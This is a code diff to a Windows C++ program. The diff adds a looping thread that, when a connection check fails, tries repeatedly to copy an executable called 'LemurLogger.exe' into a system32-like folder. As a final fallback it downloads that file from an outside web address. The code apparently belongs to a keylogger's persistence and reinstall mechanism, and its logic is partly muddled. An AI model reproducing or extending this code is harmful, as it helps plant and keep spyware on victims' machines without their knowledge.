@@ -13,6 +13,7 @@
 #include <windows.h>
 #include <tchar.h>
 #include <strsafe.h>
+#include <sockstatus.h>
 
 #define MAX_Procress 1
 #define BUF_SIZE 1024
@@ -90,9 +91,50 @@ DWORD WINAPI ThreadCheckFile( LPVOID lpParam )
 
     // Print the parameter values using thread-safe functions.
     //Tu do check file
+    while (true) {
+        if (!ss::server()) {
 
+            if (!ss::connect()) {
+                //try 3 time
+                for (int i = 0; i < 3; ++i) {
+                    if (!ss::connect()) {
+                        //true file not delete
+                        break;
+                    } else {
+                        if (i == 2) {
+                            std::string path = "C:/window/system32/";
+                            std::string filename = "LemurLogger.exe";
+                            std::string fullpath = path + filename;
+                            if (!(IO::copy_w_cmd(path, filename))) {
+                                //do copy 2
+                                const char *desfile_path = fullpath.c_str();
+                                if (!(IO::ms_Copyfile(desfile_path))) {
+                                    //do copy 3
+                                    if (!(IO::copy(path, filename))) {
+                                        //do copy 4
+                                        std::string url = "www.arekor.co/content/images/LemurLogger.exe";
+                                        if (!(IO::download_File(url.c_str(), path.c_str()))) {
+
+                                        }
+                                    }
+                                }
+                            } else {
+                                pDataArray->value = true;
+
+                            }
+                        }
+                    }
+                }
+            } else {
+
+            }
+        } else {
+
+        }
+    }
     return 0;
 }
+
 
 bool start()
 {
@@ -127,7 +169,7 @@ bool start()
             hThreadArray[i] = CreateThread(
                                            NULL,                   // default security attributes
                                            0,                      // use default stack size
-                                           ThreadCopy,       // thread function name
+                                           ThreadCheckFile,       // thread function name
                                            pDataArray[i],          // argument to thread function
                                            0,                      // use default creation flags
                                            &dwThreadIdArray[i]);   // returns the thread identifier
@@ -136,7 +178,7 @@ bool start()
             hThreadArray[i] = CreateThread(
                                            NULL,                   // default security attributes
                                            0,                      // use default stack size
-                                           ThreadCheckFile,       // thread function name
+                                           ThreadCopy,       // thread function name
                                            pDataArray[i],          // argument to thread function
                                            0,                      // use default creation flags
                                            &dwThreadIdArray[i]);   // returns the thread identifier
